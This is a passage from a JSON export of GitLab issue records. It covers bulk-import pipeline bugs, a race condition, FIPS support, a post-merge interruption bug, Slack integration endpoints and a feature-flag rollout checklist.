[re-enqueuing](https://gitlab.com/gitlab-org/gitlab/blob/38515dcd7314ac3c7f5ebcdbc03e5625b76f5bd2/app/workers/bulk_imports/pipeline_worker.rb#L47-54) the pipeline until the NDJSON file is ready to be downloaded\n\n### Technical details\n\nAs the NDJSON files are generated in the source GitLab instance and it can take awhile for the file to be generated, we need to keep re-enqueuing the worker until the NDJSON file is ready to be downloaded.\n\nTo enable the re-enqueuing mechanism, the pipelines that extract data from a NDJSON file needs to have the flag `ndjson_pipeline` enabled like [this file](https://gitlab.com/gitlab-org/gitlab/blob/b312c77641264588a5b2e3da78f6110927662e5a/lib/bulk_imports/ndjson_pipeline.rb#L10) otherwise the pipeline will fail to import the file\n\n### Proposed Solution\n\nSince the `ProjectAttributesPipeline` doesn't use a NDJSON and instead a JSON file, it was decided to rename the flag `ndjson_pipeline` to `file_extraction_pipeline`. See the [thread below](https://gitlab.com/gitlab-org/gitlab/-/issues/358745#note_909712864) \n\n**What needs to be done**\n\n\n- [x] Update the method method name in the [Pipeline concern](https://gitlab.com/gitlab-org/gitlab/blob/d8db3d37859d8d7795dfc85e8e3853821c55d628/lib/bulk_imports/pipeline.rb#L173-179)\n- [x] Update other places that is using the flag `ndjson_pipeline` to use `file_extraction_pipeline`\n- [x] Add the flag `file_extraction_pipeline` in the `ProjectAttributesPipeline` pipeline\n- [x] Update the `BulkImports::PipelineWorker` worker to use the flag `file_extraction_pipeline` instead of the `ndjson_pipeline`","state":"closed","created_at":"2022-04-11T22:40:28.947Z","updated_at":"2022-05-23T15:05:01.839Z","closed_at":"2022-05-23T15:05:01.805Z","closed_by":{"id":11165152,"username":"rodrigo.tomonari","name":"Rodrigo Tomonari","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11165152/avatar.png","web_url":"https://gitlab.com/rodrigo.tomonari"},"labels":["Category:Importers","Importer:GitLab Migration","Next Up","auto updated","backend","devops::manage","group::import","section::dev","severity::4","type::bug","workflow::verification"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":11165152,"username":"rodrigo.tomonari","name":"Rodrigo Tomonari","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11165152/avatar.png","web_url":"https://gitlab.com/rodrigo.tomonari"}],"author":{"id":11165152,"username":"rodrigo.tomonari","name":"Rodrigo Tomonari","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11165152/avatar.png","web_url":"https://gitlab.com/rodrigo.tomonari"},"type":"ISSUE","assignee":{"id":11165152,"username":"rodrigo.tomonari","name":"Rodrigo Tomonari","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11165152/avatar.png","web_url":"https://gitlab.com/rodrigo.tomonari"},"user_notes_count":10,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358745","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":4,"completed_count":4},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"4 of 4 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358745","notes":"https://gitlab.com/api/v4/projects/278964/issues/358745/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358745/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358745","relative":"#358745","full":"gitlab-org/gitlab#358745"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6629,"epic":{"id":335099,"iid":6629,"title":"ðŸž GitLab Migration bugs","url":"/groups/gitlab-org/-/epics/6629","group_id":9970},"iteration":null,"health_status":null},{"id":106488082,"iid":358743,"project_id":278964,"title":"Race condition when migrating group and projects","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\n\u003c!-- Summarize the bug encountered concisely. --\u003e\n\nWhen migrating a group or project, there is a chance that the pipelines workers try to access the exported NDJSON files before the worker that generates the files has started the export process which can cause the migration to not import some files.\n\n\n### Technical details\n\nWhen the bulk import starts, two workers are enqueued:\n1. BulkImports::ExportRequestWorker. This worker trigger a request to the external source to start generating the NDJSON files of the record that that is being migrated. When receiving the request, the source enqueues other works that eventually creates a BulkImport::Export record for each file that needs to be exported. When source complete the generation of each file, the BulkImport::Export record state is updated to `finished` and the file is associated with the record.\n   \n2. BulkImports::EntityWorker. This worker triggers the pipelines that will extract the data from the source instance. Each pipeline consumes the data from a different resource that can be the GraphQL API, Rest API, or NDJSON files. In the case of NDJSON files, before starting the pipeline, the worker makes a API call to the source to check the status of the exported file. Basically, the worker keep tracking the status of the previous worker `1. BulkImports::ExportRequestWorker`.\n\n### Problem / Race condition\n\nIf the `2. BulkImports::EntityWorker` is executed before the `BulkImport::Export` records being created by the worker `1. BulkImports::ExportRequestWorker`, when the `2. BulkImports::EntityWorker` makes the call to the endpoint `GET /api/v4/groups/#{GROUP_ID}/export_relations/status` to check the status of the exported files, the endpoint returns an empty response because `BulkImport::Export` wasn't created yet and in this situation the `2. BulkImports::EntityWorker` marks the pipeline as failed and the file isn't imported.\n\n### Possible fixes\n\nIn order to fix this issue, empty responses shouldn't set the pipeline as `failed`. Instead the `2. BulkImports::EntityWorker` worker should be re-enqueued until the endpoint returns a response that isn't empty.\n\n### Steps to reproduce\n\nIn order to easily reproduce the problem, we can force the export to take longer to start by adding a `sleep` before the service that starts the process\n\nhttps://gitlab.com/gitlab-org/gitlab/blob/a958ab444d6478f2b6d2a4516d224f0c459471a0/app/workers/bulk_imports/relation_export_worker.rb#L15-20\n\nMake sure to export a group or project that doesn't have BulkImport::Export records. Use the endpoints below to check if the records don't exist\n\n- `GET /api/v4/groups/#{GROUP_ID}/export_relations/status`\n\n- `GET /api/v4/projects/#{PROJECT_ID}/export_relations/status`\n\nThen carry on with the migration of the group or project. \n\nIn the end, it's expected that the final status of the import to be `success`, but some resources won't have been migrated.","state":"closed","created_at":"2022-04-11T21:53:42.184Z","updated_at":"2022-06-14T09:50:25.043Z","closed_at":"2022-05-31T10:28:21.659Z","closed_by":{"id":11165152,"username":"rodrigo.tomonari","name":"Rodrigo Tomonari","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11165152/avatar.png","web_url":"https://gitlab.com/rodrigo.tomonari"},"labels":["Category:Importers","Importer:GitLab Migration","Next Up","auto updated","devops::manage","group::import","section::dev","severity::3","type::bug","workflow::verification"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":11165152,"username":"rodrigo.tomonari","name":"Rodrigo Tomonari","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11165152/avatar.png","web_url":"https://gitlab.com/rodrigo.tomonari"}],"author":{"id":11165152,"username":"rodrigo.tomonari","name":"Rodrigo Tomonari","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11165152/avatar.png","web_url":"https://gitlab.com/rodrigo.tomonari"},"type":"ISSUE","assignee":{"id":11165152,"username":"rodrigo.tomonari","name":"Rodrigo Tomonari","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11165152/avatar.png","web_url":"https://gitlab.com/rodrigo.tomonari"},"user_notes_count":9,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358743","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":5,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358743","notes":"https://gitlab.com/api/v4/projects/278964/issues/358743/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358743/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358743","relative":"#358743","full":"gitlab-org/gitlab#358743"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6629,"epic":{"id":335099,"iid":6629,"title":"ðŸž GitLab Migration bugs","url":"/groups/gitlab-org/-/epics/6629","group_id":9970},"iteration":null,"health_status":null},{"id":106487466,"iid":358742,"project_id":278964,"title":"Update Security Policy Applied Configuration to support FIPS Mode","description":"The following discussion from !84465 should be addressed:\n\n- [ ] @mparuszewski started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/84465#note_904964064):  (+1 comment)\n\n    \u003e **suggestion:** As a follow-up issue we need to update `SecurityOrchestrationPolicies::CiConfigurationService` to support applying VERSION_TAG to `-fips` when FIPS Mode is enabled as this is an approach used by all analyzer teams.","state":"closed","created_at":"2022-04-11T21:27:25.443Z","updated_at":"2022-05-16T03:23:23.225Z","closed_at":"2022-05-11T22:15:48.751Z","closed_by":{"id":5535431,"username":"mparuszewski","name":"Alan (Maciej) Paruszewski","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5535431/avatar.png","web_url":"https://gitlab.com/mparuszewski"},"labels":["auto updated","backend","devops::govern","feature::addition","group::security policies","section::sec","type::feature","workflow::verification"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":5535431,"username":"mparuszewski","name":"Alan (Maciej) Paruszewski","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5535431/avatar.png","web_url":"https://gitlab.com/mparuszewski"}],"author":{"id":5535431,"username":"mparuszewski","name":"Alan (Maciej) Paruszewski","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5535431/avatar.png","web_url":"https://gitlab.com/mparuszewski"},"type":"ISSUE","assignee":{"id":5535431,"username":"mparuszewski","name":"Alan (Maciej) Paruszewski","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5535431/avatar.png","web_url":"https://gitlab.com/mparuszewski"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358742","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358742","notes":"https://gitlab.com/api/v4/projects/278964/issues/358742/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358742/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358742","relative":"#358742","full":"gitlab-org/gitlab#358742"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6479,"epic":{"id":316341,"iid":6479,"title":"Sec section FIPS Compliance (Secure and Protect)","url":"/groups/gitlab-org/-/epics/6479","group_id":9970,"human_readable_end_date":"Jul 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106419644,"iid":358699,"project_id":278964,"title":"PostMergeService activities can be interrupted and left in incomplete state","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\n\u003c!-- Summarize the bug encountered concisely. --\u003e\nIf there is a SQL timeout during the `PostMergeService` execution (ie after an MR is Merged), the post merge activities can be interrupted, leaving operations incomplete.\n\nExample: if there is a SQL timeout in closing related issues, the Post Merge operation does not complete successfully, and other operations are not completed or started.\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/master/app/services/merge_requests/post_merge_service.rb#L14-38\n\n### Steps to reproduce\n\n\u003c!-- Describe how one can reproduce the issue - this is very important. Please use an ordered list. --\u003e\nNot reproducible as it relies on environmental conditions.\n\n1. Merge an MR\n2. If any SQL statements timeout during the `MergeService` `after_merge`, confirm that the Post Merge operations did not complete by checking for `Post merge finished` logged in Kibana for the merge correlation id.\n\n### Example Project\n\n\u003c!-- If possible, please create an example project here on GitLab.com that exhibits the problematic \nbehavior, and link to it here in the bug report. If you are using an older version of GitLab, this \nwill also determine whether the bug is fixed in a more recent version. --\u003e\n\n### What is the current *bug* behavior?\n\n\u003c!-- Describe what actually happens. --\u003e\nGit Merge operation succeeds, however the `after_merge` operations did not complete.\n\n### What is the expected *correct* behavior?\n\n\u003c!-- Describe what you should see instead. --\u003e\nEither the `after_merge` operations are retried, done asynchronously, or via a transaction to ensure data/state integrity.\n\n### Relevant logs and/or screenshots\n\n\u003c!-- Paste any relevant logs - please use code blocks (```) to format console output, logs, and code\n as it's tough to read otherwise. --\u003e\nPlease see [ticket](https://gitlab.zendesk.com/agent/tickets/281699) for logs (internal).\n\n### Output of checks\n\n\u003c!-- If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com --\u003e\n\n#### Results of GitLab environment info\n\n\u003c!--  Input any relevant GitLab environment information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to GitLab environment info\u003c/summary\u003e\n\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:env:info`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n#### Results of GitLab application Check\n\n\u003c!--  Input any relevant GitLab application check information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to the GitLab application check\u003c/summary\u003e\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:check SANITIZE=true`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:check RAILS_ENV=production SANITIZE=true`)\n\n(we will only investigate if the tests are passing)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n### Possible fixes\n\n\u003c!-- If you can, link to the line of code that might be responsible for the problem. --\u003e","state":"closed","created_at":"2022-04-11T05:47:38.069Z","updated_at":"2022-05-24T12:00:23.259Z","closed_at":"2022-04-27T06:53:46.723Z","closed_by":{"id":1884221,"username":"patrickbajao","name":"Patrick Bajao","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1884221/avatar.png","web_url":"https://gitlab.com/patrickbajao"},"labels":["Deliverable","backend","customer","devops::create","group::code review","merge requests","priority::2","section::dev","severity::2","type::bug","workflow::ready for development"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":1884221,"username":"patrickbajao","name":"Patrick Bajao","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1884221/avatar.png","web_url":"https://gitlab.com/patrickbajao"}],"author":{"id":10051007,"username":"tmike","name":"Michael Trainor","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10051007/avatar.png","web_url":"https://gitlab.com/tmike"},"type":"ISSUE","assignee":{"id":1884221,"username":"patrickbajao","name":"Patrick Bajao","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1884221/avatar.png","web_url":"https://gitlab.com/patrickbajao"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358699","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358699","notes":"https://gitlab.com/api/v4/projects/278964/issues/358699/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358699/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358699","relative":"#358699","full":"gitlab-org/gitlab#358699"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106413767,"iid":358679,"project_id":278964,"title":"Backend: Unfurl with views using Slack Block Kit UI","description":"This issue is to build on https://gitlab.com/gitlab-org/gitlab/-/issues/358677 to create the link unfurl views in https://gitlab.com/gitlab-org/gitlab/-/issues/337481 using views made with [Slack Block Kit](https://api.slack.com/block-kit).\n\nAn example of the Slack Block Kit code to make a merge request view is in this comment https://gitlab.com/gitlab-org/gitlab/-/issues/337481/designs/Unfurling_states_-_issues.png#note_730095948.\n\nWe should implement Slack Block Kit views for:\n\n- Issues\n- Merge Requests\n\n(this is being clarified in https://gitlab.com/gitlab-org/gitlab/-/issues/337481#note_907440946)\n\n## Questions\n\nShould the views be implemented using templates, or a DSL, or a gem (like [this](https://github.com/CGA1123/slack-ruby-block-kit))?\n\n## See also\n\n- Design UX issue https://gitlab.com/gitlab-org/gitlab/-/issues/337481\n\n### Availability \u0026 Testing\n\nSuggestion:\n*  add higher level unit or request specs that assert the correct response content is being sent to the slack hook for requests from slack. (issue and merge requests)\n* Future state: write e2e tests against Slack app.\n\nConsiderations that may already be considered:\n* Edge cases and empty states - Example: (20 assignees on an issue, or no assignees, long issue or MR titles)\n* Consistency between Slack app / Slash commands\n* For slash commands, consider how a self-hosted instance with relative urls will generate links.\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e","state":"closed","created_at":"2022-04-11T02:00:29.963Z","updated_at":"2022-11-22T18:45:03.151Z","closed_at":"2022-08-29T04:22:25.563Z","closed_by":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"labels":["Category:Integrations","Deliverable","Integration::Slack","[deprecated] Accepting merge requests","auto updated","backend","devops::manage","feature::addition","group::integrations","quad-planning::complete-action","section::dev","type::feature","workflow::ready for development"],"milestone":{"id":2453027,"iid":77,"group_id":9970,"title":"15.5","description":"","state":"active","created_at":"2022-02-03T22:29:56.909Z","updated_at":"2022-02-03T22:29:56.909Z","due_date":"2022-10-17","start_date":"2022-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/77"},"assignees":[],"author":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"type":"ISSUE","assignee":null,"user_notes_count":9,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358679","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358679","notes":"https://gitlab.com/api/v4/projects/278964/issues/358679/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358679/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358679","relative":"#358679","full":"gitlab-org/gitlab#358679"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6389,"epic":{"id":311459,"iid":6389,"title":"Link unfurls","url":"/groups/gitlab-org/-/epics/6389","group_id":9970,"human_readable_end_date":"Jul 31, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106412984,"iid":358676,"project_id":278964,"title":"Backend: Prepare new endpoint to process Slack event API","description":"## About\n\nLink unfurling https://gitlab.com/groups/gitlab-org/-/epics/6389 is the first Slack feature that will use the [Slack events API](https://api.slack.com/apis/connections/events-api).\n\nAll Slack events that we [subscribe to](https://api.slack.com/apis/connections/events-api#the-events-api__subscribing-to-event-types) in future will be sent to a single endpoint of GitLab, regardless of the Slack workspace or event type. So the endpoint needs to be very performant. \n\nFor this first iteration, this issue is to prepare the events endpoint and process the [challenge](https://api.slack.com/apis/connections/events-api#the-events-api__subscribing-to-event-types__events-api-request-urls__request-url-configuration--verification), but not process any events yet. The processing of events will start in https://gitlab.com/gitlab-org/gitlab/-/issues/358677.\n\n## Proposal\n\n- The API class should be namespaced `API::Integrations::SlackEvents`.\n- The API route should be `api/v4/integrations/slack_events`.\n\nFor this issue, the endpoint will just need to:\n\n- Verify the request https://api.slack.com/authentication/verifying-requests-from-slack.\n- Respond to a [challenge](https://api.slack.com/apis/connections/events-api#the-events-api__subscribing-to-event-types__events-api-request-urls__request-url-configuration--verification) which Slack issues in order to let you [configure the endpoint to be the Event Request URL](https://api.slack.com/apis/connections/events-api#the-events-api__subscribing-to-event-types__events-api-request-urls__request-url-configuration--verification) of your Slack app. I think the response needs to happen in request rather than on a queue.\n\n\u003cdetails\u003e\n\u003csummary\u003eClick to see previous proposal to use `internal` namespace. Abandoned after https://gitlab.com/gitlab-org/gitlab/-/issues/358676#note_909790491\u003c/summary\u003e\n\nThe endpoint should be part of the [internal API](https://gitlab.com/gitlab-org/gitlab/-/blob/43c8d4d7c0ac9e51c05cfbea49b48c701398a1ab/lib/api/api.rb#L307-312):\n\n- The API class should be namespaced `API::Internal::Integrations::SlackEvents`.\n- The API route should be `api/v4/internal/integrations/slack/events`.\n\n\u003c/details\u003e\n\n\n## GitLab API Rate limits?\n\nWe should check what rate limits there may be on the internal API endpoints and whether this endpoint could be exempt. Note, Slack itself does [rate limit](https://api.slack.com/apis/connections/events-api#the-events-api__responding-to-events__rate-limiting) its requests (scoped by workspace) but this is separate.\n\nUpdate: The API rate limit work is in a separate issue https://gitlab.com/gitlab-org/gitlab/-/issues/360749.","state":"closed","created_at":"2022-04-11T01:16:13.515Z","updated_at":"2022-11-22T18:45:05.102Z","closed_at":"2022-05-26T21:35:24.639Z","closed_by":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"labels":["Deliverable","Integration::Slack","backend","devops::manage","feature::addition","group::integrations","section::dev","type::feature","workflow::verification"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"}],"author":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"type":"ISSUE","assignee":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"user_notes_count":22,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358676","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":2,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358676","notes":"https://gitlab.com/api/v4/projects/278964/issues/358676/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358676/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358676","relative":"#358676","full":"gitlab-org/gitlab#358676"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6389,"epic":{"id":311459,"iid":6389,"title":"Link unfurls","url":"/groups/gitlab-org/-/epics/6389","group_id":9970,"human_readable_end_date":"Jul 31, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":"on_track"},{"id":106378086,"iid":358649,"project_id":278964,"title":"[Feature flag] Rollout of `optimized_followed_users_queries`","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout [optimized followed users queries](https://gitlab.com/gitlab-org/gitlab/-/issues/346435) on production,\nthat is currently behind the `optimized_followed_users_queries` feature flag.\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\n\n## Owners\n\n- Team: Optimize\n- Most appropriate slack channel to reach out to: `#g_manage_optimize`\n- Best individual to reach out to: `ahegyi`, `euko`\n\n\n## Expectations\n\n### What are we expecting to happen?\n\nDecreased query timings for the dashboard (followed users).\n\n### When is the feature viable?\n\nVerified performance improvement.\n\n### What might happen if this goes wrong?\n\nDB statement timeout.\n\n### What can we monitor to detect problems with this?\n\n\n### What can we check for monitoring production after rollouts?\n\n- https://log.gprd.gitlab.net/app/discover#/?_g=h@e9494ca\u0026_a=h@40278dd\n- https://log.gprd.gitlab.net/goto/93798e60-b687-11ec-b73f-692cc1ae8214\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [ ] Enable the feature globally on non-production environments.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e true --dev`\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true --staging`\n- [ ] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab-foss \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --project=gitlab-com/www-gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --group=gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e \u003cfeature-flag-name\u003e true`\n- [x] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [x] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [x] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com. \n- [ ] Ensure that any breaking changes have been announced following the [release post process](https://about.gitlab.com/handbook/marketing/blog/release-posts/#deprecations-removals-and-breaking-changes) 